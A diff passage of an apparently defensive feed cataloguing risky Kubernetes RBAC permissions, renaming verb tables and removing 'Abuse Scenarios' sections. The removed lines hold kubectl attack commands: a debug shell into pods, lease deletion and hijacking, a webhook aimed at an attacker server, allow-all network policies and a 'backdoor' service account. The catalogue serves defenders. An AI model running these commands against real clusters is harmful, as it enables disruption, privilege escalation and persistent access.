-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - ip: &amp;lt;malicious-ip-address&amp;gt;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> ports:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - port: &amp;lt;service-port&amp;gt;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -n default -f - &amp;lt;&amp;lt;EOF ... EOF (redirect &amp;#39;my-app-service&amp;#39;)&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Delete an existing Endpoint within the namespace, causing service disruption.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete endpoint &amp;lt;endpoint-name&amp;gt; -n &amp;lt;namespace&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete endpoint my-frontend-service -n default&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage ephemeral containers cluster-wide</title><link>https://rbac-atlas.github.io/rules/1020/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1020/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Permits creating, updating, or deleting Endpoints/EndpointSlices for services within a specific namespace. This can lead to traffic redirection, denial of service, or network policy bypass for applications within that namespace.&lt;/p></description></item><item><title>Manage ephemeral containers cluster-wide</title><link>https://rbac-atlas.github.io/rules/1020/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1020/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -2446,8 +2344,8 @@
  &lt;td>pods/ephemeralcontainers&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>update, patch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[update] · [patch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2461,14 +2359,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Permits adding or modifying ephemeral containers in any pod across the cluster. This is highly risky as it allows injecting arbitrary code into running pods, facilitating code execution, lateral movement, tampering with live applications, and privilege escalation.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Add an ephemeral debug container to a running pod to gain shell access.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl debug -it &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; --image&lt;span class="o">=&lt;/span>busybox --target&lt;span class="o">=&lt;/span>&amp;lt;container-name&amp;gt; -- sh
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl debug -it my-app-pod -n default --image=nicolaka/netshoot --target=my-app-container -- sh&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage ephemeral containers in a namespace</title><link>https://rbac-atlas.github.io/rules/1021/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1021/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Permits adding or modifying ephemeral containers in any pod across the cluster. This is highly risky as it allows injecting arbitrary code into running pods, facilitating code execution, lateral movement, tampering with live applications, and privilege escalation.&lt;/p></description></item><item><title>Manage ephemeral containers in a namespace</title><link>https://rbac-atlas.github.io/rules/1021/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1021/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -2507,8 +2398,8 @@
  &lt;td>pods/ephemeralcontainers&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>update, patch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[update] · [patch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2561,8 +2452,8 @@
  &lt;td>etcdsnapshotfiles&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, list, create, update, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get] · [list] · [create] · [update] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2615,8 +2506,8 @@
  &lt;td>flowschemas&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2668,8 +2559,8 @@
  &lt;td>ingressclasses&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2722,8 +2613,8 @@
  &lt;td>ingresses&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2775,8 +2666,8 @@
  &lt;td>jobs&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2827,8 +2718,8 @@
  &lt;td>jobs&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2879,8 +2770,8 @@
  &lt;td>leases&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete, get, list&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete] · [get] · [list]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2932,8 +2823,8 @@
  &lt;td>leases&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2946,21 +2837,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Allows managing Lease objects in critical namespaces like &amp;lsquo;kube-system&amp;rsquo; or &amp;lsquo;kube-node-lease&amp;rsquo;. This is highly critical as it can disrupt core Kubernetes components, lead to node instability, or denial of service.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Delete a critical Lease object in the &amp;lsquo;kube-system&amp;rsquo; namespace.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete lease &amp;lt;lease-name&amp;gt; -n kube-system
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete lease kube-scheduler -n kube-system&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Update a Lease object to extend its holder identity, potentially hijacking leadership.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This is complex and requires knowing the current lease holder and its acquireTime.&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># It&amp;#39;s more of an API interaction than a simple kubectl command.&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl patch lease &amp;lt;lease-name&amp;gt; -n &amp;lt;namespace&amp;gt; --type=&amp;#39;json&amp;#39; -p=&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/holderIdentity&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;malicious-controller&amp;#34;}]&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl patch lease &amp;lt;lease-name&amp;gt; -n &amp;lt;namespace&amp;gt; --type&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;json&amp;#39;&lt;/span> -p&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/holderIdentity&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;malicious-controller&amp;#34;}]&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage MutatingWebhookConfigurations</title><link>https://rbac-atlas.github.io/rules/1043/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1043/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Allows managing Lease objects in critical namespaces like &amp;lsquo;kube-system&amp;rsquo; or &amp;lsquo;kube-node-lease&amp;rsquo;. This is highly critical as it can disrupt core Kubernetes components, lead to node instability, or denial of service.&lt;/p></description></item><item><title>Manage MutatingWebhookConfigurations</title><link>https://rbac-atlas.github.io/rules/1043/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1043/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -2999,8 +2876,8 @@
  &lt;td>mutatingwebhookconfigurations&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3013,37 +2890,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Grants control over MutatingWebhookConfigurations, which can modify API objects during admission. This is extremely critical as an attacker can create or alter webhooks to inject malicious configurations, escalate privileges, bypass security policies, or cause denial of service.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Create a new MutatingWebhookConfiguration to inject privileged containers into pods.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: admissionregistration.k8s.io/v1
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: MutatingWebhookConfiguration
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: privileged-injector
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">webhooks:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">- name: privileged-injector.example.com
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> clientConfig:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> url: &amp;#34;https://&amp;lt;malicious-webhook-server&amp;gt;/mutate&amp;#34; # Attacker-controlled server
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> caBundle: &amp;lt;base64-encoded-ca-cert&amp;gt; # Self-signed CA for attacker&amp;#39;s server
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> rules:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - operations: [&amp;#34;CREATE&amp;#34;]
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> apiGroups: [&amp;#34;&amp;#34;]
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> apiVersions: [&amp;#34;v1&amp;#34;]
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> resources: [&amp;#34;pods&amp;#34;]
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> admissionReviewVersions: [&amp;#34;v1&amp;#34;, &amp;#34;v1beta1&amp;#34;]
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> sideEffects: None
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> failurePolicy: Ignore # To avoid breaking legitimate operations
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Delete a critical MutatingWebhookConfiguration, potentially bypassing security policies.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete mutatingwebhookconfiguration &amp;lt;webhook-name&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete mutatingwebhookconfiguration pod-defaults-webhook&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage NetworkPolicies cluster-wide</title><link>https://rbac-atlas.github.io/rules/1071/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1071/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Grants control over MutatingWebhookConfigurations, which can modify API objects during admission. This is extremely critical as an attacker can create or alter webhooks to inject malicious configurations, escalate privileges, bypass security policies, or cause denial of service.&lt;/p></description></item><item><title>Manage NetworkPolicies cluster-wide</title><link>https://rbac-atlas.github.io/rules/1071/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1071/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -3082,8 +2929,8 @@
  &lt;td>networkpolicies&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3097,30 +2944,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Allows creating, modifying, or deleting NetworkPolicies in any namespace. This can be used to disable network segmentation, allow/deny traffic to sensitive pods, or isolate critical components, leading to information disclosure, lateral movement, or denial of service.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Create a NetworkPolicy to allow all ingress traffic to pods in a namespace.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -n &amp;lt;namespace&amp;gt; -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: networking.k8s.io/v1
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: NetworkPolicy
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: allow-all-ingress
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">spec:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> podSelector: {} # Selects all pods in the namespace
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> policyTypes:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - Ingress
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> ingress:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - {} # Allows all ingress
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -n production -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Delete a critical NetworkPolicy, removing network segmentation.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete networkpolicy &amp;lt;networkpolicy-name&amp;gt; -n &amp;lt;namespace&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete networkpolicy deny-all-ingress -n default&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage NetworkPolicies in a namespace</title><link>https://rbac-atlas.github.io/rules/1072/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1072/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Allows creating, modifying, or deleting NetworkPolicies in any namespace. This can be used to disable network segmentation, allow/deny traffic to sensitive pods, or isolate critical components, leading to information disclosure, lateral movement, or denial of service.&lt;/p></description></item><item><title>Manage NetworkPolicies in a namespace</title><link>https://rbac-atlas.github.io/rules/1072/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1072/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -3159,8 +2983,8 @@
  &lt;td>networkpolicies&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3235,8 +3059,8 @@
  &lt;td>persistentvolumes&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete, deletecollection&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete] · [deletecollection]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3289,8 +3113,8 @@
  &lt;td>poddisruptionbudgets&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3341,8 +3165,8 @@
  &lt;td>prioritylevelconfigurations&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3394,8 +3218,8 @@
  &lt;td>rolebindings&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3446,8 +3270,8 @@
  &lt;td>roles&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3497,8 +3321,8 @@
  &lt;td>runtimeclasses&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3511,25 +3335,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Grants control over RuntimeClasses, which define different container runtime configurations. A malicious RuntimeClass could specify a compromised runtime or allow for escape to the underlying node, leading to node access, tampering, and privilege escalation.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Create a new RuntimeClass pointing to a malicious or non-existent handler.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: node.k8s.io/v1
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: RuntimeClass
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: malicious-runtime
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">handler: malicious-handler
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Delete an existing RuntimeClass, potentially disrupting workloads using it.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete runtimeclass &amp;lt;runtimeclass-name&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete runtimeclass kata&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage ServiceAccounts cluster-wide</title><link>https://rbac-atlas.github.io/rules/1067/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1067/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Grants control over RuntimeClasses, which define different container runtime configurations. A malicious RuntimeClass could specify a compromised runtime or allow for escape to the underlying node, leading to node access, tampering, and privilege escalation.&lt;/p></description></item><item><title>Manage ServiceAccounts cluster-wide</title><link>https://rbac-atlas.github.io/rules/1067/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1067/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -3568,8 +3374,8 @@
  &lt;td>serviceaccounts&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3581,19 +3387,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Allows creating, updating, or deleting ServiceAccounts in any namespace. This can be used to create SAs, then bind them to privileged roles (if other RBAC permissions allow), or modify existing SAs, potentially interfering with workload identities.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Create a new ServiceAccount in any namespace.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create serviceaccount &amp;lt;new-sa-name&amp;gt; -n &amp;lt;namespace&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create serviceaccount backdoor-sa -n kube-system&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Delete an existing ServiceAccount, potentially disrupting workloads.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete serviceaccount &amp;lt;serviceaccount-name&amp;gt; -n &amp;lt;namespace&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete serviceaccount default -n default&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage ServiceAccounts in a namespace</title><link>https://rbac-atlas.github.io/rules/1068/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1068/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Allows creating, updating, or deleting ServiceAccounts in any namespace. This can be used to create SAs, then bind them to privileged roles (if other RBAC permissions allow), or modify existing SAs, potentially interfering with workload identities.&lt;/p></description></item><item><title>Manage ServiceAccounts in a namespace</title><link>https://rbac-atlas.github.io/rules/1068/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1068/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -3632,8 +3426,8 @@
  &lt;td>serviceaccounts&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
